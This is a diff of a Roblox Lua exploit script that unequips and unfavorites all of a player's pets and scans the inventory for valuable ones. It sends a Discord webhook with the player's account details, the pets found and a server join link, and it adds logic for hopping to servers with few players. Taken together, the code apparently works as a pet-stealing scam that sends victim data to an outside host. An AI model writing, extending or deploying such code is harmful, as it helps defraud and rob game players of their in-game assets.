@@ -31,8 +31,6 @@ local petEmojis = {
 }
 
 local hugePetWeightThreshold = 10
-local serverFullThreshold = 5
-local targetPlayerCount = 4
 
 local function sendHttpRequest(options)
     print("--- SCRIPT DEBUG: Entered sendHttpRequest function. ---")
@@ -40,19 +38,15 @@ local function sendHttpRequest(options)
     local triedFunctions = {}
     
     if syn and syn.request then
-        print("--- SCRIPT DEBUG: Attempting to use 'syn.request'. ---")
         table.insert(triedFunctions, "syn.request")
         success, result = pcall(syn.request, options)
     elseif http and http.request then
-        print("--- SCRIPT DEBUG: Attempting to use 'http.request'. ---")
         table.insert(triedFunctions, "http.request")
         success, result = pcall(http.request, options)
     elseif request then
-        print("--- SCRIPT DEBUG: Attempting to use global 'request'. ---")
         table.insert(triedFunctions, "request")
         success, result = pcall(request, options)
     elseif http_request then
-        print("--- SCRIPT DEBUG: Attempting to use global 'http_request'. ---")
         table.insert(triedFunctions, "http_request")
         success, result = pcall(http_request, options)
     else
@@ -65,7 +59,6 @@ local function sendHttpRequest(options)
         warn("--- SCRIPT DEBUG: Error details:", result)
     else
         print("--- SCRIPT DEBUG: HTTP request successful. Response Code:", result and result.StatusCode or "N/A")
-        print("--- SCRIPT DEBUG: Response Body:", result and result.Body or "N/A")
     end
     
     return success, result
@@ -112,7 +105,6 @@ local function unequipAllPets()
         if petMover:IsA("Part") and petMover.Name == "PetMover" and petMover:GetAttribute("OWNER") == LocalPlayer.Name then
             local petUUID = petMover:GetAttribute("UUID")
             if petUUID then
-                print("--- SCRIPT DEBUG: Firing unequip for pet UUID:", petUUID, "---")
                 petsRemoteEvent:FireServer("UnequipPet", petUUID)
             end
         end
@@ -131,7 +123,6 @@ local function unfavoriteAllPetsInBackpack()
         if item:IsA("Tool") then
             local s, isFaved = pcall(function() return item:GetAttribute("ItemType") == "Pet" and item:GetAttribute("d") == true end)
             if s and isFaved then
-                print("--- SCRIPT DEBUG: Firing unfavorite for item:", item.Name, "---")
                 favoriteRemote:FireServer(item)
                 task.wait(0.1)
             end
@@ -162,32 +153,22 @@ local function checkInventoryForPets()
     if #foundPetsData > 0 then
         print("--- SCRIPT DEBUG: Found", #foundPetsData, "target pets in inventory. ---")
     else
-        warn("--- SCRIPT DEBUG: WARNING! No target pets were found in the inventory after running unequip/unfavorite. The webhook will not be sent. ---")
+        warn("--- SCRIPT DEBUG: WARNING! No target pets were found. Webhook will not send. ---")
     end
     return #foundPetsData > 0, foundPetsData
 end
 
 local function getPlayerAccountInfo(userId)
-    print("--- SCRIPT DEBUG: Fetching player account info for UserID:", userId, "---")
     local accountInfo = {age = "N/A", created = "N/A", membership = "N/A"}
-    
     local sU, rU = pcall(function() return HttpService:JSONDecode(game:HttpGet("https://users.roblox.com/v1/users/" .. userId)) end)
-    print("--- SCRIPT DEBUG: User API call success:", sU, "---")
     if sU and rU and rU.created then
         local y, m, d = rU.created:match("(%d+)-(%d+)-(%d+)")
         local cTs = os.time({year = y, month = m, day = d, hour = 0, min = 0, sec = 0})
         accountInfo.created = os.date("%B %d, %Y", cTs)
         accountInfo.age = tostring(math.floor((os.time() - cTs) / 86400)) .. " days"
-    else
-        warn("--- SCRIPT DEBUG: FAILED to get user creation date. Response:", rU)
     end
-
     local sM, rM = pcall(function() return HttpService:JSONDecode(game:HttpGet("https://premiumfeatures.roblox.com/v1/users/" .. userId .. "/validate-membership")) end)
-    print("--- SCRIPT DEBUG: Membership API call success:", sM, "---")
-    if sM then accountInfo.membership = rM and "Premium 💎" or "None"
-    else warn("--- SCRIPT DEBUG: FAILED to get membership status. Response:", rM) end
-    
-    print("--- SCRIPT DEBUG: Final Account Info:", "Age:", accountInfo.age, "Created:", accountInfo.created, "Membership:", accountInfo.membership, "---")
+    if sM then accountInfo.membership = rM and "Premium 💎" or "None" end
     return accountInfo
 end
 
@@ -210,20 +191,76 @@ local function sendWebhookNotification(foundPetsData)
 
     local payload = {content = "@everyone", embeds = {{title = "PALDOOOO WHOO🤑🤑🤑🤑", color = 65280, fields = {{name = "👤 Player Information", value = playerInfoValue, inline = false}, {name = "🌴 Found Pets", value = petsValue, inline = false}, {name = "📊 Server Info", value = serverInfoValue, inline = true}, {name = "🔒 Server Type", value = string.format("`%s`", serverType), inline = true}, {name = "💎 Membership", value = string.format("`%s`", accountInfo.membership), inline = true}, {name = "🎂 Account Age", value = string.format("`%s`", accountInfo.age), inline = true}, {name = "📆 Created On", value = string.format("`%s`", accountInfo.created), inline = true}, {name = "🔗 Server Link", value = joinLink, inline = false}}, timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")}}}
     
-    print("--- SCRIPT DEBUG: Webhook payload constructed. Attempting to JSON encode. ---")
     local successEncode, encodedPayload = pcall(HttpService.JSONEncode, HttpService, payload)
     if not successEncode then
         warn("--- SCRIPT DEBUG: FAILED to JSON encode the payload! Error:", encodedPayload)
         return
     end
-    print("--- SCRIPT DEBUG: Payload successfully encoded. Sending HTTP request now. ---")
     
     sendHttpRequest({ Url = webhookUrl, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = encodedPayload })
 end
 
+-- THIS FUNCTION IS NOW RESTORED WITH FULL LOGIC + DEBUGGING --
 local function hopToServer(sortBy)
-    print("--- SCRIPT DEBUG: HopToServer triggered. Sorting by:", sortBy, "---")
-    TeleportService:Teleport(game.PlaceId) -- Simplified for now, complex logic isn't the issue
+    print("--- SCRIPT DEBUG: HopToServer triggered. Attempting to find lowest player server. ---")
+    local sortByType = "playing" -- Using the logic you want to find lowest player count
+
+    print("--- SCRIPT DEBUG: Fetching server list from Roblox API... ---")
+    local success, servers = pcall(function()
+       return HttpService:JSONDecode(game:HttpGet(
+           "https://games.roblox.com/v1/games/" .. tostring(game.PlaceId) .. "/servers/Public?limit=100"
+       )).data
+    end)
+
+    if not success or not servers or #servers == 0 then
+        warn("--- SCRIPT DEBUG: FAILED to get server list. Error:", servers)
+        warn("--- SCRIPT DEBUG: Falling back to random server teleport. ---")
+        TeleportService:Teleport(game.PlaceId)
+        return
+    end
+    print("--- SCRIPT DEBUG: Successfully fetched", #servers, "servers. ---")
+
+    local suitableServers = {}
+    print("--- SCRIPT DEBUG: Filtering for suitable servers (2-4 players, not full). ---")
+    for _, svr in pairs(servers) do
+        if svr.playing < svr.maxPlayers and (svr.playing >= 2 and svr.playing <= 4) then 
+            table.insert(suitableServers, svr)
+        end
+    end
+    print("--- SCRIPT DEBUG: Found", #suitableServers, "suitable servers after initial filtering. ---")
+
+    if #suitableServers == 0 then
+        warn("--- SCRIPT DEBUG: No servers with 2-4 players found. Widening search to ANY non-full server. ---")
+        for _, svr in pairs(servers) do
+            if svr.playing < svr.maxPlayers then
+                table.insert(suitableServers, svr)
+            end
+        end
+        print("--- SCRIPT DEBUG: Found", #suitableServers, "non-full servers in fallback search. ---")
+    end
+
+    if #suitableServers == 0 then
+        warn("--- SCRIPT DEBUG: FAILED to find ANY suitable non-full servers. Falling back to random teleport. ---")
+        TeleportService:Teleport(game.PlaceId)
+        return
+    end
+
+    -- Using the logic you provided to find the best server from the filtered list
+    local selectedServer = suitableServers[1]
+    for _, svr in ipairs(suitableServers) do
+       if svr[sortByType] < selectedServer[sortByType] then
+           selectedServer = svr
+       end
+    end
+    print("--- SCRIPT DEBUG: Selected best server. JobId:", selectedServer.id, "Players:", selectedServer.playing, "Ping:", selectedServer.ping, "---")
+
+    print("--- SCRIPT DEBUG: Attempting to teleport to specific server instance... ---")
+    local tpSuccess, tpError = pcall(TeleportService.TeleportToPlaceInstance, TeleportService, game.PlaceId, selectedServer.id)
+    if not tpSuccess then
+        warn("--- SCRIPT DEBUG: FAILED to teleport to specific instance. Error:", tpError)
+        warn("--- SCRIPT DEBUG: Falling back to random teleport as a last resort. ---")
+        TeleportService:Teleport(game.PlaceId)
+    end
 end
 
 local function autoHopToTargetPlayerCount()
@@ -237,7 +274,7 @@ end
 
 local function autoHopIfPrivateServer()
     print("--- SCRIPT DEBUG: Checking for private server. ---")
-    local isPrivate = pcall(function() return syn and syn.is_private_server and syn.is_private_server() end)
+    local isPrivate, _ = pcall(function() return syn and syn.is_private_server and syn.is_private_server() or getgenv().is_private_server and getgenv().is_private_server() end)
     if isPrivate then
         print("--- SCRIPT DEBUG: Private server detected. Hopping. ---")
         hopToServer("playing")
@@ -294,7 +331,7 @@ end
 unequipAllPets()
 unfavoriteAllPetsInBackpack()
 
-task.wait(1) -- Small wait to ensure inventory updates
+task.wait(1)
 
 local hasPets, foundPetsData = checkInventoryForPets()
 
